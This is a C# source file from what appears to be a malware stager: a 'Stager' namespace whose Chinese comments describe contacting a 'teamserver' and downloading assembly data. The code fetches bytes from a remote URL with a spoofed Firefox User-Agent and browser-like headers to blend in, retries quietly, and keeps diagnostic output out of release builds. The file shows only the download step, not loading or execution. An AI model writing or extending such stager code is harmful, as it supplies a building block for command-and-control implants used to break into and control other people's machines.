using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Threading;


namespace Stager
{
    
    class Commons
    {
        /// <summary>
        /// 通过GET发送数据给teamserver
        /// </summary>
        /// <param name="URL">Get提交的URL地址</param>
        /// <returns>下载的程序集数据</returns>
        public static byte[] HttpGet(Uri URL, string Endpoint = "")
        {
            Uri FullUrl = new Uri(URL, Endpoint);
#if DEBUG
            Console.WriteLine("[*] Attempting HTTP GET to {0}", FullUrl);
#endif
            return Retry.Do(() =>
            {
                using (var wc = new WebClient())
                {
                    //wc.Proxy = WebRequest.GetSystemWebProxy();
                    //wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
                    wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0");
                    wc.Headers.Add("Accept", "*/*");
                    wc.Headers.Add("Accept-Language", "zh - CN,zh; q = 0.8,zh - TW; q = 0.7,zh - HK; q = 0.5,en - US; q = 0.3,en; q = 0.2");
                    wc.Headers.Add("Cache-Control", "max-age=0");
                   byte[] data = wc.DownloadData(FullUrl);
#if DEBUG
                    Console.WriteLine("[*] Downloaded {0} bytes", data.Length);
#endif              
                    return data;
                }
            }, TimeSpan.FromSeconds(1), 10);
        }

    }

    public static class Retry
    {
        public static T Do<T>(Func<T> action, TimeSpan retryInterval,
            int maxAttempts = 3)
        {
            var exceptions = new List<Exception>();

            for (var attempts = 0; attempts < maxAttempts; attempts++)
            {
                try
                {
                    if (attempts > 0)
                    {
                        Thread.Sleep(retryInterval);
                    }
#if DEBUG
                    Console.WriteLine($"[-] Attempt #{attempts + 1}");
#endif
                    return action();
                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine("\t[!] {0}", ex.Message);
#endif
                    exceptions.Add(ex);
                }
            }

            throw new AggregateException(exceptions);
        }
    }
}
